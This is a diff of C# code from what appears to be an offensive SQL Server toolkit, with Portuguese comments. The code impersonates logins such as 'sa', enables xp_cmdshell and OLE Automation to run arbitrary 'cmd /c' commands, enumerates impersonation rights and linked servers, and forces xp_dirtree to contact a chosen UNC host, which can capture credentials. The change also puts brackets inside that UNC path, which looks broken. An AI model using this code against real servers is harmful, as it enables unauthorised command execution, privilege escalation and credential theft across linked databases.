@@ -154,7 +154,7 @@ namespace ExtensionToolkit.Func
         {
             // Monta a query para executar a impersonação do usuário
             string executeAs = linkedServer != null
-                ? $"EXEC {linkedServer}.msdb.dbo.sp_executesql N'EXECUTE AS USER = ''{user}'';'"
+                ? $"EXEC [{linkedServer}].msdb.dbo.sp_executesql N'EXECUTE AS USER = ''{user}'';'"
                 : $"USE msdb; EXECUTE AS USER = '{user}';";
 
             // Executa a query
@@ -169,7 +169,7 @@ namespace ExtensionToolkit.Func
         {
             // Monta a query para executar a impersonação do login
             string executeAs = linkedServer != null
-                ? $"EXEC {linkedServer}.msdb.dbo.sp_executesql N'EXECUTE AS LOGIN = ''{user}'';'"
+                ? $"EXEC [{linkedServer}].msdb.dbo.sp_executesql N'EXECUTE AS LOGIN = ''{user}'';'"
                 : $"EXECUTE AS LOGIN = '{user}';";
 
             // Executa a query
@@ -186,12 +186,12 @@ namespace ExtensionToolkit.Func
 
             // Comandos para habilitar xp_cmdshell
             string enableXpcmd = linkedServer != null
-                ? $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT {linkedServer};"
+                ? $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linkedServer}];"
                 : "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
 
             // Verifica se linkedServer está presente
             string execCmd = linkedServer != null
-                ? $"EXEC ('EXEC xp_cmdshell ''{cmd}''') AT {linkedServer};"
+                ? $"EXEC ('EXEC xp_cmdshell ''{cmd}''') AT [{linkedServer}];"
                 : $"EXEC xp_cmdshell '{cmd}'";
 
             // Executa o comando para habilitar xp_cmdshell
@@ -210,11 +210,11 @@ namespace ExtensionToolkit.Func
             ExecuteImpersonationLogin(con, "sa", linkedServer);
 
             string enableOle = linkedServer != null
-                ? $"EXEC ('EXEC sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;') AT {linkedServer};"
+                ? $"EXEC ('EXEC sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;') AT [{linkedServer}];"
                 : "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
 
             string execCmd = linkedServer != null
-                ? $"EXEC {linkedServer}.master.dbo.sp_executesql N'DECLARE @myshell INT; EXEC sp_oacreate ''wscript.shell'', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''run'', null, ''cmd /c \"{cmd}\"'';'"
+                ? $"EXEC [{linkedServer}].master.dbo.sp_executesql N'DECLARE @myshell INT; EXEC sp_oacreate ''wscript.shell'', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''run'', null, ''cmd /c \"{cmd}\"'';'"
                 : $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{cmd}\"';";
 
             Console.WriteLine($"Enabling Ole Automation Procedures...");
@@ -235,7 +235,7 @@ namespace ExtensionToolkit.Func
 
             if (!string.IsNullOrEmpty(linkedServer))
             {
-                query = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT DISTINCT b.name " +
+                query = $"SELECT * FROM OPENQUERY([{linkedServer}], 'SELECT DISTINCT b.name " +
                          "FROM sys.server_permissions a " +
                          "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id " +
                          "WHERE a.permission_name = ''IMPERSONATE'';');";
@@ -261,7 +261,7 @@ namespace ExtensionToolkit.Func
 
             if (!string.IsNullOrEmpty(linkedServer))
             {
-                query = $"EXEC ('EXEC sp_linkedservers') AT {linkedServer};";
+                query = $"EXEC ('EXEC sp_linkedservers') AT [{linkedServer}];";
             }
             else
             {
@@ -288,11 +288,11 @@ namespace ExtensionToolkit.Func
 
             if (!string.IsNullOrEmpty(linkedServer))
             {
-                query = $"EXEC ('EXEC master..xp_dirtree \"\\\\{host}\\\\test\"') AT {linkedServer};";
+                query = $"EXEC ('EXEC master..xp_dirtree \"\\\\[{host}]\\\\test\"') AT [{linkedServer}];";
             }
             else
             {
-                query = $"EXEC master..xp_dirtree \"\\\\{host}\\\\test\";";
+                query = $"EXEC master..xp_dirtree \"\\\\[{host}]\\\\test\";";
             }
             Console.WriteLine($"Attempting to execute: {query}");
 
@@ -324,11 +324,11 @@ namespace ExtensionToolkit.Func
 
             if (!string.IsNullOrEmpty(linkedServer))
             {
-                queryLogin = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT SYSTEM_USER;')";
-                queryUser = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT USER_NAME();')";
-                queryPublicRole = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT IS_SRVROLEMEMBER(''public'');')";
-                querySysAdminRole = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT IS_SRVROLEMEMBER(''sysadmin'');')";
-                queryServerName = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT @@SERVERNAME;')";
+                queryLogin = $"SELECT * FROM OPENQUERY([{linkedServer}], 'SELECT SYSTEM_USER;')";
+                queryUser = $"SELECT * FROM OPENQUERY([{linkedServer}], 'SELECT USER_NAME();')";
+                queryPublicRole = $"SELECT * FROM OPENQUERY([{linkedServer}], 'SELECT IS_SRVROLEMEMBER(''public'');')";
+                querySysAdminRole = $"SELECT * FROM OPENQUERY([{linkedServer}], 'SELECT IS_SRVROLEMEMBER(''sysadmin'');')";
+                queryServerName = $"SELECT * FROM OPENQUERY([{linkedServer}], 'SELECT @@SERVERNAME;')";
             }
 
             string login = ExecuteScalarQuery(con, queryLogin);
